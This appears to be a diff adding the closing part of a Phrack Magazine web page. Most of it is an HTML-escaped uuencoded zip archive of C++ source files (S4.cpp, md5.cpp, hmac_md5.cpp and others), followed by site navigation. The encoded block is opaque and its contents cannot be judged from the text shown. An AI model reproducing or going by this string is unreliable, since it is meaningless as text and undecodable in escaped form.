+M4!-)&quot;GYH!V5U)&quot;Y*L`$\QT&lt;4IM#*+_,=8V3&lt;@6VA)`J7SYY=Z?EM-LUQ%NG)
+M'I71GJ&gt;&lt;+P]OYT5Y*N.OO*#B,72.X8'V%)F7_DR8F`PL8NRD.B\K2T6LJR?-
+MJJ_*F(,QXFY\6B&gt;8CQ^1S6%7X17/_&amp;[6(ZJC&lt;$K[49'WPH?0NPFDP(.-IB)W
+MZA3BGR&gt;?%QNA`)6JVV[U,6^2V!Z(??VS+V3VJ&lt;OMKIZM*VB%5[`$&gt;#&lt;++/Y[
+M=JZ&amp;G]ES.^HD&quot;3:IR&amp;3$*&quot;&gt;&gt;*Z)],EQX](C5G;%5LD9#W#4)QF6ENN/6@W,%
+M6P^&amp;?J,2$`K_GKS!AMZ,'_\9P;=)&lt;#,=CEBID[D$XEDR.JK76.*4F&quot;NEF&lt;6$
+MW&quot;+UO@,T/_AG^S3U469L27VG#W1V-&gt;ZAHVA+/*N68E8M(].*Q&gt;&lt;PIVHRQ$C;
+M\63':*'0[AGKI,=)AI/L9K3K/,Q@*04^C$Q6,:D]P=2,]R&amp;M4&lt;=1NJ&lt;&amp;2@]#
+MW2^BZ;+?:&lt;A-&lt;C.%HXJ65#&gt;&amp;,8U8.6BFF[TQ#Z4&amp;_%2&lt;EH)OQ&lt;JP@?80%NSM
+M.N&quot;GF9U_PBWJNP6%`,J(\]GP8O[8&gt;1@&amp;LP5_(2D6$3`;H,&amp;8BN]$&gt;M#)T2GA
+M]*3[Y\[=:M'HWRY%`9=YUNAB`IU!XNRB;\1&amp;^&lt;T#20_=F&lt;PRX[(R[P0/HX5;
+M4^X/&quot;JV)K\C&quot;[+.WD._I8$Z%$D9F4Z2.SM&quot;`K_F4&lt;)^ZI3D!W7V`&amp;]0D*#./
+MP1:HR`K[X&amp;GG_+S?NZ?G/(KYF\?:PS;8/AJT_&amp;B,M%Z,]ID&lt;!D/[76(ZF_)2
+MR[BPR6#S&amp;)0$&quot;]B@I-9`8K'D+P0^BR#94W%2.$&lt;H\&amp;!I).,LDRM&quot;*6N1Z$+C
+MJI'!0\]37N0AZ&amp;3)CBI1%`[)7G3B1J%OD1&amp;Z)$4059*(XY'J@DP6D$1^[YN1
+MS]!?.CW8(ZF!&lt;7`&gt;![B'FHI,BK]0CP&amp;M&lt;3JYV?X&quot;&lt;R)A)'2FD_9.OW7QF[CS
+M=X:&lt;OXJ`Q;.Q_A',IT%X*0V1\3(`(%-#L[:9/T19R@#-LP]_B54&quot;R&amp;8-^#72
+M:4_@MR/RT8P0YU(LX8`)LZPD5)&gt;6_K*:K-A.UFAH7UK&lt;\&amp;`T\&lt;8\R-0@#D_V
+M6GTHXN*(`&quot;56(,BISLJ,&gt;9X[+`Y4(XLD,.=,V&gt;7T\LR7`A_&quot;A`1`+8UO*2QJ
+M3=,(PK!LCK9XC,W,:`Q;I$8R-&amp;.%J+5AF**.K9\W21D697CXRYJ%$;B!2YY%
+MJ0W#[)155O&amp;ZOKJ1AJ&gt;,#:;&gt;$?^F].&amp;X'&lt;WR-D^R84G]FA'0I,HLZJXLBJ&lt;@
+MC(PBWZ'JI.FP0M.1WB^Y6DY]E99S8&gt;HT^OPCSSP@+?3[KJDSC[-2QU&amp;75++*
+M[EK2(DUV^[KX5@W&quot;R5(AC*/%7Y$1MHV;2PS`WRP=8DBEU:&lt;8Z)1`X$L6&gt;O:7
+MK%'B;A32C2I]0?ZR4)G&gt;F89*W!Z?O%77J&lt;@)EIQSP)E+NJI!FPNQ39G;TK%&lt;
+MWMO+:YS9-.13.6C1&gt;2)$,`1_Y&amp;/H%K&amp;BRJ&lt;!\&amp;YNR^)?P4*_?ST)``J&quot;QS&quot;N
+MH3?'1Z3+FC'/%V.&lt;9/A\$MQ-YX]6IDE2$MGXS0K]W.01M3B-K&lt;&gt;`F%&quot;4&amp;J:B
+M)-&gt;&amp;N6:2CL2MXR,X_O9;&gt;UU^@O&gt;HTW,J#Z\KU&gt;M!5.G@&gt;.]]_[S5&lt;*&quot;HPO\T
+M$J51[CE9IT&amp;!B+$ZH/$QA`:!4+?G&gt;`V;2MI&amp;6=OD-5+&gt;21RO(-*/FWV8C-!*
+MP7&gt;+9DI5';AVTF[T#_=ZATK'2UQMJ,\95P4VF9Z&gt;^EUMK(H+&lt;TQ[D29[LKN\
+M=*^VL-?==1VFD\$E1@I8=0,I;6Y1\E&gt;)G'DC=+E3K:%U*?%9;IA&lt;:BG'318+
+MMZ!PJYZLH&amp;Y3+ZOUK9J:@9CQ1&amp;)?$K-NNQ7]LF_^8MQ;JY$.T`.]/0J'4YBA
+M$[1@_0+K&quot;@X,L@^=I!!^7M[&quot;&gt;A.NB[X^,J&lt;@LR;R)*S06[\Y:PZ:W6:[4*35
+MW#D[B&amp;(D8`\=WKIF4K4AT%8\OWW&gt;Y%T&lt;A$\7USR(RO&amp;,'TB'E&lt;ME?)%*R=&lt;J
+MRA55+6/E862XT3!DWX&quot;,QC=R7B=B2&lt;=733F9US$#SLP&quot;!X@L@3&quot;Y\R$,+!#V
+M-83]-2!T+1`B6_S-=.J+D1]XRJ77F.E\N&amp;T#KF(#?&quot;4^D.X?&lt;&lt;Y8S.GAJ@0D
+MD&amp;7&gt;_7C1S)DJDL'58JKM4R24T&gt;/:Z$TS3K?=DXG[^_C&gt;]_G9\;%R4JR)&amp;68@
+M-AWL&gt;&gt;7B5\ICC,_=D9U7/=I&lt;I[UV.L?G?M_@6_/&gt;`'J,6@[/[A?L^3OBDQEG
+M4;YM*SG$9D+F'(.7[=N59#&quot;=(Y3NR&gt;5[J*13;K&gt;?Z7W*2CE%..U68^;9P]@,
+M2;)'FC0%B\83[H\FOBN7OK*P;L)(E-&lt;@&amp;4JX0*:G'0=S)!WK_U&quot;3M6[3).AH
+MTO*OFT@PPRH'.U1QDV8E.KP;%GRL'5GP_TPYL&lt;-*&amp;&amp;I40,M&amp;BFW@?Z1N2U='
+M&gt;1:@7BY'5^7V)#R&lt;AIQ-723*KH_&quot;KC\4O\*$P$*]*@A0Z0I1/)2D%!K&lt;K(2(
+M1DN&lt;41+&amp;T-KAAPF16-$T+I$BMHX9DTE&gt;T`]H7,W7=NJ:&lt;T&quot;3G`&gt;:=R*&gt;L;&quot;,
+ML=1,%$P+-B=K-&amp;0$FZB*H'*@+=.%+4JNU7RGHUG,)JENH;9$&quot;W.'J1M!=G0)
+M];E%'IG5-79TX&lt;-?S!C,^%$S5546I%OP@359';\FZBK\$Y5CP^(A\5Z[_4ZY
+M*#0O55KB_+-.UYO3@5Y/9/IDDS+]*](8]GQ)F\B&lt;+W6-I-U_9;WCPD9/6?H5
+MM;-QT*1/=:%HG^Q)J3EVQ-9NA6C^G,`S&amp;\WH@B(&amp;E28\V17I67;LUJA_7/@,
+M_VSTRA$5NVJJU*:00]*(W^*=:X:+]:Z5/@NZZ[8PYSON0;#R'(QJ&quot;8K?GKB4
+M3A(8K'9%DEBQ:&amp;(AXD[;&gt;6B&quot;&amp;&amp;_@_S\G(`*IGH&lt;&quot;*&lt;J`#5&quot;\.&quot;W/STN(GS^W
+M6_6R](Y*(_H\3+L[(&gt;(;OL8WHOUR&amp;,(Y)$;%U#%^2[FN*#&amp;FL]FOM&gt;R-QM?)
+M?/AI&quot;9&quot;7R=[-?#&lt;%W&lt;&gt;Z\^EPS_?G&lt;$!3EW;'4\\_'@WF'AR[&quot;Y-@X&lt;U&amp;]5K9
+M'X\+17W!5CCJ6\$6Y#K+S8[O9K^#\H-0BL$U&lt;+*DWG&lt;M;XM\-Q8F0.B&gt;M`3&amp;
+MP);+W[6]QO'=.,0@$A+&amp;16M60CJ1CF#@9S;606&gt;O_7&amp;O&gt;Y1&amp;)P50ZYA9KPZX
+MUB&lt;X?B0.K[-PT*\8N-8G.GX@#K6=*.K`@D&lt;6+6H_FA8U20MG5&lt;(W1&quot;;WR8]U
+MD#I=`#9)C#*A%@P-:@\4V&amp;4@Z*@*YRZ\G?R5E4))05!3Q;-L48A.QJ@WY\@F
+MHTI25!A%J36LRJQ+*JOP=4XA,V%68:QE_HRM.!\&lt;Z`O0,&lt;R1]CNEX^689FP4
+MA/%[4'TPX$DYG2[%F-+:AO)28&lt;+O;M@]B:4.KXSW:=]&gt;]NK5I\W8%AO'(?)1
+MWQ*?L%L&gt;R-*380/&gt;1-R3J153&lt;;+BT-L[87&lt;Q@6V@(FZO]0KB#AH]7@?/*24T
+MG4,Q:F2([D&gt;PR]+V2R[G,`(IS-F%N5[9JE8JE34THIC=@C4.M,U:#&amp;^9EZPR
+M)`CO)+8L.LAN;MO8.U%_#82,_/_%G);=V*%,W?Z:-GPKX[N;F=V4]!UR&lt;7&lt;=
+MOQ&gt;=R&lt;5B;(GPB=NGM0LWYR9&gt;S,D`K:QDZ+Z.V&lt;^E-X;4'E;?-(O_Z!M]29;H
+M2CW;J1`O0=(&gt;A7'CJ?G!\&quot;1,&amp;D7C+H0.&gt;FO(\&gt;M^;!Z#LL1N,35]:G;7L1PJ
+M=VE8E'?PB5*`D\?P+&lt;@*Z=C)_)_G0@T`EEZ(EB1,@\AK6]Z;E@U'94W@7P1;
+M,?#E3&lt;&quot;VW^Z&lt;'G7:*R_8]@AMT0XFH\&quot;/;M+,ZT9]S2/'Y#W2WL-!+R'YRXA@
+M@A8N%1\SG-[=W4]H7Y'MR*SFS6;`?B%?W-'U(&lt;JIX,%#[YQRU`.=/X@E;\VW
+MAY051=OWT-&amp;GIYUTG%RJM,\^G;X_WVMW@#`7G=:%21KEW%TKDT69GW2D&lt;2X]
+MM!Z)@ASEE^&quot;Q8+@%4;MU+3&quot;IFO\!;4*M%K5PHL'J6\C_#TLH_7Z44OQDD+@Y
+M82E#O./`P*;H&amp;DZ1$'U_8*1WX+`*Z[1-1`$X1$^8&lt;#_)-ZF(]&lt;XI!10QW=8/
+MFDCH38YKS3G+FC7+O-EG+N43DIJ]U/SES6#&gt;'#K.7D(0?M?L2;U51RG(8.X,
+MH[6=B%D.I79WTH0-Y&lt;E)RK8&gt;B&amp;CVASV&quot;[92,^!YJQZ,93`^HW$/LVU=R&quot;@-!
+MD=&lt;&amp;(`71.0#&amp;&gt;#UZP)C-P2-%&gt;Z+E7TOJ^(M&amp;/V2466ZS*=G-U\K&amp;!#37\$]+
+M.%514%&quot;O]TQ?G*-)(C+OHFTB^NV_Z^9O9*K0ZMV?'*&amp;C[;\Z+8PUG[OV,,W+
+M+FQZX&lt;532,&gt;\(S=M&amp;9V-:VM+&lt;62!B?N&quot;J7F,N8*E7$Q6KN5HU:723//GC!S4
+M'`QO/J\JZ\&lt;?594?XPG-Z)_MJNGV)5=!W.4KGU7M'C7?X=7.3+N30&quot;?R]TKM
+M[#:/K&gt;_#V+:R+`O+P)'C\U/YY0R&quot;)UQ.,])1@#2)^&gt;NS\Q(&amp;5&gt;(M+^A98XH!
+MOI9Q9*A\4&gt;L;D%5E29=8TO/&lt;96-?!P:FR:?T,@AJ=&quot;CIF%`?=]*9P9[6N/GM
+M8-N4/Z9A&amp;'SZ/U!+`0(4``H``````-%&gt;A4`````````````````'````````
+M````$`````````!3-&quot;YP-C@O4$L!`A0`%``&quot;``@`9V_'-I(9)'05&amp;P``L4&lt;`
+M``X``````````0`@````)0```%,T+G`V.&quot;]#3U!924Y'4$L!`A0`%``&quot;``@`
+M_:*!0$3GD9N&gt;`0``0P,```\``````````0`@````9AL``%,T+G`V.&quot;]G;&amp;]B
+M86PN:%!+`0(4`!0``@`(``JE@4!VK/V$0@,``,\*```3``````````$`(```
+M`#$=``!3-&quot;YP-C@O:&amp;UA8U]M9#4N8W!P4$L!`A0`%``&quot;``@`&lt;Z2!0%Z7NI:J
+M#```32D```X``````````0`@````I&quot;```%,T+G`V.&quot;]M9#4N8W!P4$L!`A0`
+M%``&quot;``@`[**!0.+_SLVR`@``S04```P``````````0`@````&gt;BT``%,T+G`V
+M.&quot;]M9#4N:%!+`0(4`!0``@`(`+E&gt;A4!!P_$XX&quot;P``(B@```-``````````$`
+K(````%8P``!3-&quot;YP-C@O4S0N8W!P4$L%!@`````'``&lt;`H`$``&amp;%=````````
+`
+end
+
+---[ EOF
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
